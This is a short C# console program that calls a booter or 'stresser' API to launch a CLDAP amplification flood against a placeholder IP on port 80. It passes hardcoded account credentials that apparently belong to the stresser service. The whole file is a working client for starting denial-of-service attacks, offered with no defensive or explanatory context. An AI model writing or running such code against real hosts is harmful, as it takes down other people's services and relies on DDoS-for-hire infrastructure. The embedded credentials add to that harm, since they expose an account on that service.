using System;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            /* API For only browser Edge */
            StressersAPI.InstantStresser instantStresser = new StressersAPI.InstantStresser();
            Console.WriteLine(instantStresser.StartStrees("IP", 80, StressersAPI.InstantStresser.Method.CLDAP, "Nekiplay1", "125125"));
        }
    }
}
